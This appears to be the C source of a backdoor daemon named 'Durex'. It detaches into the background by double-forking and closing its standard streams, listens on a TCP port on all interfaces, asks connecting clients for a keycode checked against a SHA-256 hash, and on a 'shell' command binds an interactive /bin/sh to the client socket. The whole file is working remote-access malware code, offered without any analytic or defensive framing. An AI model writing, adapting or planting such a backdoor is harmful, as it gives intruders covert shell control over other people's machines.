#include "durex.h"
#include "sha256.h"

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/file.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

typedef enum e_client_state
{
    CLIENT_WAITING_PASSWORD,
    CLIENT_AUTHENTICATED,
    CLIENT_SPAWNING
}   t_client_state;

typedef struct s_client
{
    int             fd;
    t_client_state  state;
    char            buffer[1024];
    size_t          len;
}   t_client;

static int g_pid_fd = -1;
static FILE *g_log = NULL;

static void log_message(const t_durex_config *cfg, const char *msg)
{
    if (!g_log)
    {
        g_log = fopen(cfg->log_path, "a");
        if (!g_log)
            return ;
    }
    fprintf(g_log, "%s\n", msg);
    fflush(g_log);
}

static int acquire_pid_lock(const char *pid_path)
{
    int fd;

    fd = open(pid_path, O_RDWR | O_CREAT, 0644);
    if (fd == -1)
        return (-1);
    if (flock(fd, LOCK_EX | LOCK_NB) == -1)
    {
        close(fd);
        return (-1);
    }
    return fd;
}

static void write_pid_file(int fd, pid_t pid)
{
    char buffer[32];
    ssize_t len;

    if (fd < 0)
        return ;
    if (ftruncate(fd, 0) == -1)
        return ;
    len = snprintf(buffer, sizeof(buffer), "%d\n", (int)pid);
    write(fd, buffer, (size_t)len);
    fsync(fd);
}

static void handle_sigchld(int sig)
{
    (void)sig;
    while (waitpid(-1, NULL, WNOHANG) > 0)
        ;
}

static void prepare_signals(void)
{
    struct sigaction    sa;

    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART | SA_NOCLDSTOP;
    sa.sa_handler = handle_sigchld;
    sigaction(SIGCHLD, &sa, NULL);
    signal(SIGPIPE, SIG_IGN);
}

static int send_message(int fd, const char *msg)
{
    size_t len = strlen(msg);
    return (send(fd, msg, len, 0) == (ssize_t)len) ? 0 : -1;
}

static int verify_password(const t_durex_config *cfg, const char *password)
{
    uint8_t digest[SHA256_DIGEST_LENGTH];
    char    hex[65];

    sha256_compute((const uint8_t *)password, strlen(password), digest);
    sha256_hex(digest, hex);
    return (strncmp(hex, cfg->password_hash, DUREX_PASSWORD_HASH_LENGTH) == 0);
}

static void remove_client(t_client clients[DUREX_MAX_CLIENTS], int index)
{
    if (clients[index].fd != -1)
    {
        close(clients[index].fd);
        clients[index].fd = -1;
    }
    clients[index].state = CLIENT_WAITING_PASSWORD;
    clients[index].len = 0;
}

static void spawn_shell(int fd)
{
    pid_t pid;

    pid = fork();
    if (pid == 0)
    {
        dup2(fd, STDIN_FILENO);
        dup2(fd, STDOUT_FILENO);
        dup2(fd, STDERR_FILENO);
        execl("/bin/sh", "sh", "-i", NULL);
        _exit(EXIT_FAILURE);
    }
}

static void process_command(t_client clients[DUREX_MAX_CLIENTS], int index, const t_durex_config *cfg)
{
    char    *line;

    (void)cfg;
    line = clients[index].buffer;
    while (*line && (*line == ' ' || *line == '\t'))
        ++line;
    if (strcmp(line, "?\n") == 0 || strcmp(line, "help\n") == 0)
    {
        send_message(clients[index].fd, "? show help\n");
        send_message(clients[index].fd, "shell Spawn remote shell on 4242\n");
    }
    else if (strncmp(line, "shell", 5) == 0)
    {
        send_message(clients[index].fd, "Spawning shell...\n");
        spawn_shell(clients[index].fd);
        remove_client(clients, index);
        return ;
    }
    else
    {
        send_message(clients[index].fd, "Unknown command. Type '?' for help.\n");
    }
    send_message(clients[index].fd, "$> ");
}

static void handle_client_input(t_client clients[DUREX_MAX_CLIENTS], int index, const t_durex_config *cfg)
{
    ssize_t bytes;

    bytes = recv(clients[index].fd, clients[index].buffer + clients[index].len,
        sizeof(clients[index].buffer) - clients[index].len - 1, 0);
    if (bytes <= 0)
    {
        remove_client(clients, index);
        return ;
    }
    clients[index].len += (size_t)bytes;
    clients[index].buffer[clients[index].len] = '\0';
    if (strchr(clients[index].buffer, '\n') == NULL)
        return ;
    if (clients[index].state == CLIENT_WAITING_PASSWORD)
    {
        char *newline = strchr(clients[index].buffer, '\n');
        *newline = '\0';
        if (verify_password(cfg, clients[index].buffer))
        {
            send_message(clients[index].fd, "$> ");
            clients[index].state = CLIENT_AUTHENTICATED;
        }
        else
        {
            send_message(clients[index].fd, "Access denied.\n");
            remove_client(clients, index);
            return ;
        }
        clients[index].len = 0;
    }
    else if (clients[index].state == CLIENT_AUTHENTICATED)
    {
        process_command(clients, index, cfg);
        clients[index].len = 0;
    }
}

static void accept_new_client(int listen_fd, t_client clients[DUREX_MAX_CLIENTS], const t_durex_config *cfg)
{
    struct sockaddr_in  addr;
    socklen_t           addrlen;
    int                 fd;

    (void)cfg;
    addrlen = sizeof(addr);
    fd = accept(listen_fd, (struct sockaddr *)&addr, &addrlen);
    if (fd == -1)
        return ;
    for (int i = 0; i < DUREX_MAX_CLIENTS; ++i)
    {
        if (clients[i].fd == -1)
        {
            clients[i].fd = fd;
            clients[i].state = CLIENT_WAITING_PASSWORD;
            clients[i].len = 0;
            send_message(fd, "Keycode: ");
            return ;
        }
    }
    send_message(fd, "Server busy.\n");
    close(fd);
}

static int run_daemon(const t_durex_config *cfg)
{
    int                 listen_fd;
    struct sockaddr_in  addr;
    t_client            clients[DUREX_MAX_CLIENTS];

    listen_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (listen_fd == -1)
    {
        log_message(cfg, "socket creation failed");
        return (-1);
    }
    int opt = 1;
    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons((uint16_t)cfg->port);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);

    if (bind(listen_fd, (struct sockaddr *)&addr, sizeof(addr)) == -1)
    {
        log_message(cfg, "bind failed");
        close(listen_fd);
        return (-1);
    }
    if (listen(listen_fd, DUREX_MAX_CLIENTS) == -1)
    {
        log_message(cfg, "listen failed");
        close(listen_fd);
        return (-1);
    }

    for (int i = 0; i < DUREX_MAX_CLIENTS; ++i)
    {
        clients[i].fd = -1;
        clients[i].state = CLIENT_WAITING_PASSWORD;
        clients[i].len = 0;
    }

    while (1)
    {
        fd_set  readfds;
        int     max_fd;

        FD_ZERO(&readfds);
        FD_SET(listen_fd, &readfds);
        max_fd = listen_fd;
        for (int i = 0; i < DUREX_MAX_CLIENTS; ++i)
        {
            if (clients[i].fd != -1)
            {
                FD_SET(clients[i].fd, &readfds);
                if (clients[i].fd > max_fd)
                    max_fd = clients[i].fd;
            }
        }
        if (select(max_fd + 1, &readfds, NULL, NULL, NULL) == -1)
        {
            if (errno == EINTR)
                continue ;
            log_message(cfg, "select failed");
            break ;
        }
        if (FD_ISSET(listen_fd, &readfds))
            accept_new_client(listen_fd, clients, cfg);
        for (int i = 0; i < DUREX_MAX_CLIENTS; ++i)
        {
            if (clients[i].fd != -1 && FD_ISSET(clients[i].fd, &readfds))
                handle_client_input(clients, i, cfg);
        }
    }

    close(listen_fd);
    return (0);
}

int durex_run(const t_durex_config *cfg, char *const argv[])
{
    char    exe_path[512];
    ssize_t len;
    pid_t   pid;

    (void)argv;
    g_pid_fd = acquire_pid_lock(cfg->pid_path);
    if (g_pid_fd == -1)
    {
        fprintf(stderr, "Durex already running.\n");
        return (-1);
    }

    pid = fork();
    if (pid < 0)
        return (-1);
    if (pid > 0)
    {
        write_pid_file(g_pid_fd, pid);
        return (0);
    }

    if (setsid() == -1)
        _exit(EXIT_FAILURE);
    pid = fork();
    if (pid < 0)
        _exit(EXIT_FAILURE);
    if (pid > 0)
        _exit(EXIT_SUCCESS);

    write_pid_file(g_pid_fd, getpid());
    prepare_signals();

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (len > 0)
    {
        exe_path[len] = '\0';
        log_message(cfg, exe_path);
    }

    run_daemon(cfg);
    if (g_log)
        fclose(g_log);
    if (g_pid_fd != -1)
    {
        unlink(cfg->pid_path);
        close(g_pid_fd);
    }
    return (0);
}
